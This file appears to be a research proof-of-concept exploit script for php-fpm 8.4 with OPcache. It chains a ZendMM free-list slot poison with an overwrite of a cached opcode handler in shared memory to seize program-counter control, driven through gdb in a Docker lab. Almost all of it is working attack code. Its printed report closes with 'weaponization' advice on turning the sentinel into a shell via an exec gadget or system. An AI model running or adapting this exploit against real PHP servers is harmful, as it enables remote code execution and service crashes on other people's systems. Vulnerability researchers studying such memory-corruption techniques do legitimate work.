#!/usr/bin/env python3
r"""Compose the ZendMM free-list slot poison with an OPcache shared-memory
cached-handler overwrite for validation-free PC control. php-fpm 8.4.26,
opcache.enable=1.

A cached zend_op->handler in SHM is dispatched with no per-request re-validation
(no checksum to clear, unlike file_cache), but SHM lands ~139 TB from the request
chunk. The free-list poison dissolves the reach: emalloc returns a chosen address
inside the SHM, and an ordinary write into that allocation overwrites a cached
opline's handler. The next call to the function jumps through it -- crash PC ==
the chosen sentinel. Steps: derive SHM base (binbase + one deref, or JIT
arithmetic) -> locate the cached op_array handler slot offset-free -> recover the
shadow key from one chunk-local read -> poison -> overwrite -> fire. An interior
opline (>=1) must be targeted; opline[0]/RECV is inert.

RESEARCH: the allocator + SHM overwrite is driven against the live allocator via
its exported _emalloc/_efree/zend_mm_get_heap through the in-container gdb
instrument (standing in for a chunk-local UAF write + binbase/shadow disclosure);
the black-box groom that seats the write on a still-linked slot is the open gap.
The fire itself is black-box (plain HTTP). Not a black-box landed RCE. Pure
stdlib, python3 -I safe. Lab use, systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import re
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


FLP = _load("freelist_slot_poison", "primitives/write/freelist_slot_poison.py")
OSH = _load("opcache_shm_probe", "opcache_shm_probe.py")
OHL = _load("opcache_handler_locate", "primitives/shm/opcache_handler_locate.py")

DEFAULT_COMPOSE = os.path.join(os.path.dirname(os.path.dirname(_HERE)), "docker-compose.fpm-avenues.yml")
DEFAULT_SERVICE = "shmfl-fpm"
DEFAULT_HOST_URL = "http://127.0.0.1:8165/index.php"
DEFAULT_FUNC = "hot"
DEFAULT_OPLINE = OHL.DEFAULT_OPLINE
# A canonical, unmapped sentinel. The VM's `goto *handler` jumps here, so the
# SIGSEGV RIP == this value (proof of PC control). Canonical (bits 48..63 clear)
# so the fault is a page fault AT the target, not a non-canonical #GP at the jmp.
SENTINEL = 0x414243444546
ZEND_USER_FUNCTION = OHL.ZEND_USER_FUNCTION
ZEND_OP_SIZE = OHL.ZEND_OP_SIZE
OPCODES_FIELD_SCAN = OHL.OPCODES_FIELD_SCAN
LAST_FIELD_OFF = OHL.LAST_FIELD_OFF


class ShmHandlerRCE:
    """Compose the free-list slot poison with the OPcache SHM cached-handler
    overwrite. Drives the live worker via the free-list-poison gdb instrument."""

    def __init__(self, compose_file=DEFAULT_COMPOSE, service=DEFAULT_SERVICE,
                 func=DEFAULT_FUNC, verbose=False):
        self.compose_file = compose_file
        self.service = service
        self.func = func
        self.verbose = verbose
        self.flp = FLP.FreeListPoison(compose_file, service, verbose=verbose)

    # -- plumbing ----------------------------------------------------------
    def _exec(self, *cmd, binary=False, user_root=True, timeout=90):
        full = ["docker", "compose", "-f", self.compose_file, "exec", "-T"]
        if user_root:
            full += ["--user", "root"]
        full += [self.service] + list(cmd)
        r = subprocess.run(full, capture_output=True, timeout=timeout)
        return r.stdout if binary else r.stdout.decode("utf-8", "replace")

    def worker_pids(self):
        return FLP.worker_pids(self.compose_file, self.service)

    def warm(self, host_url=DEFAULT_HOST_URL):
        subprocess.run(["curl", "-s", "-o", "/dev/null", "--max-time", "8", host_url],
                       capture_output=True)

    def maps(self, pid):
        return OSH.Maps(self._exec("cat", f"/proc/{pid}/maps", user_root=False))

    def dump(self, pid, addr, size):
        return OSH.dump_mem(self.compose_file, self.service, pid, addr, size)

    # -- (0) SHM base derivation ------------------------------------------
    def derive_shm_base(self, pid):
        """Derive the SHM base two ways and corroborate against /proc:
          no-JIT: binbase + a .bss SHM pointer + ONE read (the deref).
          JIT   : binbase - 0xc000000 (pure arithmetic, 0 reads).
        Returns a dict with the proc-observed base, the .bss anchor, and the
        JIT-constant candidate."""
        return OHL.derive_shm_base(self.compose_file, self.service, pid,
                                   self.maps(pid))

    # -- (1) locate the cached op_array handler slot ----------------------
    def locate_cached_handler(self, pid, opline_index=DEFAULT_OPLINE, dump_mb=40):
        """Offset-free: scan the SHM for the interned func name, cross-reference
        the op_array, find `opcodes`, return the interior opline handler slot."""
        return OHL.locate_cached_handler(
            self.compose_file, self.service, pid, self.maps(pid), self.func,
            opline_index=opline_index, dump_mb=dump_mb)

    # -- (2)+(3)+(4) poison -> SHM slot -> write forged handler -----------
    def poison_write_handler(self, pid, handler_slot, forged=SENTINEL):
        """Recover shadow_key (one chunk-local read), poison a freed bin-320 slot
        so the next emalloc returns `handler_slot` (inside the SHM), and write the
        forged handler there. Returns the poison result dict."""
        rk = self.flp.read_shadow_key(pid)
        if rk is None:
            return {"error": "could not read a bin-320 slot (worker state?)"}
        key, head, nxt, shadow = rk
        r = self.flp.poison_alloc(pid, head, handler_slot, key,
                                  writeback=int(forged).to_bytes(8, "little"))
        r["shadow_key"] = key
        r["forged"] = forged
        r["returned_shm_slot"] = (r.get("q2") == handler_slot)
        return r

    def restore_handler(self, pid, handler_slot, orig):
        """Put the original handler back (non-destructive reliability loop)."""
        FLP._gdb(self.compose_file, self.service, pid, [
            f'set *(unsigned long*)({handler_slot:#x}) = {orig:#x}'])

    # -- (5) fire ----------------------------------------------------------
    def fire(self, pid, host_url=DEFAULT_HOST_URL, expect=SENTINEL, wait=3.0,
             burst=14):
        """Launch a background gdb on the (poisoned) worker that catches SIGSEGV,
        drive a burst of HTTP requests, and return the faulting RIP. The forged
        handler must already be in the shared SHM slot, so EVERY worker crashes on
        the cached call; the burst ensures the gdb-watched worker serves one and
        faults into gdb. Destructive: workers die (the master respawns them)."""
        logf = "/tmp/shmfl_fire.log"
        self._exec("sh", "-c",
                   f"timeout 30 gdb -p {pid} -batch -nx -ex 'set confirm off' "
                   f"-ex 'handle SIGSEGV stop print nopass' -ex 'continue' "
                   f"-ex 'printf \"CRASH_PC=%#lx\\n\", $pc' -ex 'detach' -ex 'quit' "
                   f"> {logf} 2>&1 &", user_root=True)
        time.sleep(wait)
        http = None
        for _ in range(burst):
            http = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                                   "--max-time", "8", host_url],
                                  capture_output=True).stdout.decode()
            # stop early once the watched worker has faulted into gdb
            if "CRASH_PC=" in self._exec("cat", logf, user_root=True):
                break
            time.sleep(0.2)
        time.sleep(1.5)
        log = self._exec("cat", logf, user_root=True)
        m = re.search(r"CRASH_PC=(0x[0-9a-fA-F]+)", log)
        crash_pc = int(m.group(1), 16) if m else None
        return {
            "http_code": http, "crash_pc": crash_pc, "expected": expect,
            "pc_controlled": (crash_pc == expect),
            "segv": ("SIGSEGV" in log),
        }


def demonstrate(compose_file, service, host_url, opline_index, verbose=True,
                do_fire=True):
    rce = ShmHandlerRCE(compose_file, service, verbose=verbose)
    rce.warm(host_url)
    pids = rce.worker_pids()
    if not pids:
        raise RuntimeError("no fpm workers (is the lab up? curl the front once)")
    pid = pids[0]

    rep = {"worker": pid, "opline_index": opline_index}
    rep["shm_derivation"] = rce.derive_shm_base(pid)
    loc = rce.locate_cached_handler(pid, opline_index=opline_index)
    if loc is None:
        raise RuntimeError("could not locate the cached op_array handler in SHM "
                           "(is the app warmed and opcache.enable=1?)")
    rep["handler_location"] = loc

    # (2)+(3)+(4) poison -> SHM slot -> forged handler.
    pr = rce.poison_write_handler(pid, loc["handler_slot"], forged=SENTINEL)
    rep["poison"] = pr

    # (5) fire (destructive; worker dies, master respawns).
    if do_fire and pr.get("returned_shm_slot") and pr.get("alive"):
        rep["fire"] = rce.fire(pid, host_url=host_url, expect=SENTINEL)
    elif not do_fire and loc["orig_handler"] is not None:
        # non-destructive: disarm the shared SHM so the next request is clean.
        rce.restore_handler(pid, loc["handler_slot"], loc["orig_handler"])
        rep["restored"] = True
    return rep, rce


def _h(v):
    return v if v is None else hex(v)


def print_report(rep):
    P = print
    P("=" * 78)
    P("OPcache SHM cached-handler RCE via free-list poison (#1)  worker pid %d"
      % rep["worker"])
    P("=" * 78)
    d = rep["shm_derivation"]
    P("(0) SHM-base derivation")
    P("    binbase            : %s" % _h(d["binbase"]))
    P("    SHM base (/proc)   : %s  size=%s perm=%s"
      % (_h(d["proc_shm_base"]),
         OSH._human(d["shm_size"]) if d["shm_size"] else "?", d["shm_perm"]))
    if d["bss_anchor"]:
        off, val, srel = d["bss_anchor"]
        P("    .bss SHM pointer   : binbase+%#x -> %#x (== SHM base, ONE read)"
          % (off, val))
        P("    image SHM pointers : %d (no-JIT: binbase + .bss ptr + 1 read)"
          % d["image_shm_pointers"])
    P("    JIT constant route : binbase - 0xc000000 = %s  (applies to the shmfl-fpm-jit"
      % _h(d["jit_derived_base"]))
    P("                         service: SHM = binbase - delta, 0 reads; here no-JIT)")
    loc = rep["handler_location"]
    P("-" * 78)
    P("(1) cached op_array located in SHM (offset-free scan)")
    P("    op_array           : %#x  (type=ZEND_USER_FUNCTION)" % loc["op_array"])
    P("    opcodes[]          : %#x  last=%d oplines" % (loc["opcodes"], loc["last"]))
    P("    target opline[%d]   : handler slot %#x  orig=%s (a php-fpm .text handler)"
      % (loc["opline_index"], loc["handler_slot"], _h(loc["orig_handler"])))
    pr = rep["poison"]
    P("-" * 78)
    P("(2) shadow_key          : %s  (one chunk-local read, no struct offset)"
      % _h(pr.get("shadow_key")))
    P("(3) poison -> emalloc returns the SHM slot")
    P("    q1=%s q2=%s  returned chosen SHM slot: %s  worker alive: %s  panic: %s"
      % (_h(pr.get("q1")), _h(pr.get("q2")), pr.get("returned_shm_slot"),
         pr.get("alive"), pr.get("panicked")))
    P("(4) ordinary write -> forged handler in SHM")
    P("    forged handler      : %#x   read back from SHM: %s"
      % (pr.get("forged", 0), _h(pr.get("readback"))))
    if "fire" in rep:
        f = rep["fire"]
        P("-" * 78)
        P("(5) FIRE -- one HTTP request to the cached function")
        P("    http status         : %s  (502 => worker crashed into the handler)"
          % f["http_code"])
        P("    faulting RIP        : %s   (chosen: %#x)"
          % (_h(f["crash_pc"]), f["expected"]))
        P("    PC CONTROLLED       : %s   <== validation-free RCE on the next call"
          % f["pc_controlled"])
    P("=" * 78)
    P("Weaponization: point the forged handler at an exec gadget / the a7 function-")
    P("resolve step (get_properties_for = system) instead of the sentinel. That")
    P("PC->shell last mile needs the SAME binbase anchor already used in step (0).")
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="OPcache SHM cached-handler RCE via the ZendMM free-list poison")
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default=DEFAULT_SERVICE)
    ap.add_argument("--host-url", default=DEFAULT_HOST_URL)
    ap.add_argument("--opline", type=int, default=DEFAULT_OPLINE,
                    help="interior opline index to overwrite (opline[0]/RECV is inert)")
    ap.add_argument("--no-fire", action="store_true",
                    help="skip the destructive fire (keep the worker alive)")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation (the _exec helper inherits os.environ).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-shmfl"
    os.environ["COMPOSE_PROFILES"] = "shmfl"
    rep, _ = demonstrate(a.compose_file, a.service, a.host_url, a.opline,
                         do_fire=not a.no_fire)
    if a.json:
        import json
        print(json.dumps(rep, indent=2,
                         default=lambda o: hex(o) if isinstance(o, int) else o))
    else:
        print_report(rep)
    ok = (rep["poison"].get("returned_shm_slot") and rep["poison"].get("alive")
          and (rep.get("fire", {}).get("pc_controlled", True)))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
